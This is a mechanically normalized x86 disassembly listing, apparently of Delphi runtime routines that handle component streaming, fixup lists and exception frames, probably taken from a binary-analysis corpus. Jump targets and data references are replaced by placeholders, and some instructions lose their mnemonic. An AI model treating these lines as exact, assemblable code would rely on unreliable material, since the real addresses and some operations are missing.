mov esi eax
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7d714
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_3a62ee0
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a7d75c
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_3a62efc
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7d860
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_3a652f4
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_3a652f4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a7d8b8
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
movzx edx [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_3a65390
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_3a657d8
mov al 0x1
inc ebx
sub_3a7d910
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7d987
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_3a77324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7d98e
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_3a76534
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
mov ecx eax
mov eax esi
pop edx
call sub_3a6eff0
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
sub_3a7d994
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a7da3d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7da44
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] edi
movzx eax [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_3a65390
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_3a83b84
mov esi eax
test esi esi
jne r-xdata
add al 0xd3
sub al 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a69490
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_3a7da60
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_3a7a4f0
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_3a7a4f0
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_3a7a33c
sub_3a7da98
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_3a7a4f0
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_3a7a4f0
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_3a7a388
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_3a7a33c
sub_3a7dae0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_3a7dc9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_3a7a898
mov edi eax
xor eax eax
push ebp
push sub_3a7dc7d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7dc84
mov eax [ rw-data ]
call sub_3a7a8fc
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7dc5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7dc0c
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_3a7a494
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_3a79e50
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7dc13
mov eax [ ebp - 0x8 ]
call sub_3a64380
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_3a767bc
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_3a7da60
pop ecx
mov edx esi
mov eax edi
call sub_3a7a388
mov eax ebx
call sub_3a64380
jmp r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x2
jne r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_3a7da98
pop ecx
inc esi
push ebp
mov eax [ ebx + 0x4 ]
call sub_3a7da98
pop ecx
inc esi
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_3a7d994
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
jmp r-xdata
sub_3a7dc13
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3a7a494
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3a7dcac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_3a7a898
mov edi eax
xor eax eax
push ebp
push sub_3a7dd47
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a7a8fc
retn
mov edx ebx
mov eax edi
call sub_3a7a494
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_3a7a388
mov eax esi
call sub_3a64380
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_3a69490
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3a7dd58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_3a7a898
mov edi eax
xor eax eax
push ebp
push sub_3a7ddcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a7a8fc
retn
mov edx ebx
mov eax edi
call sub_3a7a494
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_3a7a388
mov eax esi
call sub_3a64380
sub_3a7de00
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
pop ecx
pop edx
pop ebx
retn
sub_3a7de44
push ebx
push esi
push edi
call sub_3a6478c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7d75c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7de80
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_3a7ff4c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_3a8005c
call sub_3a7ddf4
sub_3a7dea4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x80 ]
mov eax esi
call sub_3a69490
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x80 ]
call sub_3a652a0
sub_3a7dee0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_3a69490
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7ff4c
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7dfaa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_3a7e3e4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3a7e3e4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7dfb1
mov eax [ ebp - 0x8 ]
call sub_3a64380
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3a8005c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] 0x1
call sub_3a7ddf4
sub_3a7dfdc
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x62 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_3a7e000
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x1
lea eax [ ebp - 0x10c ]
mov edx [ ebp - 0x8 ]
mov ecx 0xff
call sub_3a6553c
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_3a64604
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
sete [ ebp - 0x9 ]
push esi
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov [ esi ] eax
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_3a7e088
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_3a6553c
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_3a64604
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_3a7ddf4
sub_3a7e0f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_3a7a898
mov esi eax
xor edx edx
push ebp
push sub_3a7e160
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7e167
mov eax [ rw-data ]
call sub_3a7a8fc
retn
mov edx ebx
mov eax esi
call sub_3a7a494
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_3a64380
mov edx ebx
mov eax esi
call sub_3a7a388
sub_3a7e16c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7e2a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7e2a9
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
xor edx edx
push ebp
push sub_3a7e285
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a7e2d4
retn
inc eax
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_3a7a494
call sub_3a7e0f0
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x7a ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_3a7d8b8
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x7c ]
call [ edi + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_3a7a494
mov ebx eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_3a65338
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a7d994
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_3a7a494
mov edx eax
mov eax [ rw-data ]
call sub_3a7a810
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_3a7a5e0
jmp r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
sub_3a7e2b0
push ebx
mov ebx eax
mov eax ebx
call sub_3a7e3a8
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_3a7cbbc
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_3a7e2d4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_3a64380
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_3a7a494
call sub_3a64380
inc edi
dec esi
jne r-xdata
sub_3a7e310
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_3a64258
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_3a7991c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x84 ]
test eax eax
je r-xdata
mov eax ebp
call sub_3a6430c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_3a79994
mov edi eax
mov edx [ esp + 0x4 ]
call sub_3a79894
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_3a64274
test al al
jne r-xdata
sub_3a7e3e4
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_3a7e430
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_3a7e430
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
sub_3a7e480
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a7e4d0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a7fdac
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
dec eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0x4 ]
movzx ebx [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7e4d7
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
call sub_3a7ddf4
sub_3a7e4e0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a7e52c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a7fe68
mov eax [ ebp - 0x4 ]
call sub_3a65bfc
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7e533
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
call sub_3a7ddf4
sub_3a7e53c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_3a7e5dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a7dfc8
test al al
jne r-xdata
mov eax ebx
call sub_3a7dfc8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7b178
jmp r-xdata
mov eax ebx
call sub_3a7e3c0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_3a7f084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7e5e3
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_3a7b0ac
mov esi eax
mov eax ebx
call sub_3a7f07c
jmp r-xdata
mov eax ebx
call sub_3a7efcc
mov eax ebx
call sub_3a7dfc8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7f1e8
mov eax ebx
call sub_3a7f084
sub_3a7e60c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a66414
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_3a7a33c
inc esi
dec ebx
jne r-xdata
sub_3a7e648
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_3a83ca4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a66414
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_3a665d0
add esp 0x4
mov edx ebx
mov eax edi
call sub_3a83c78
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a66414
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_3a83c78
test [ eax + 0x24 ] 0x4
je r-xdata
sub_3a7e6c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a66414
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
movzx eax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
movzx eax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_3a7e728
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_3a7e748
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_3a62f64
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_3a7e728
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_3a80254
call sub_3a62f64
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_3a64380
sub_3a7e7a8
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_3a7e88e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3a803f4
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x72 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x74 ]
call [ esi + 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_3a7e862
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
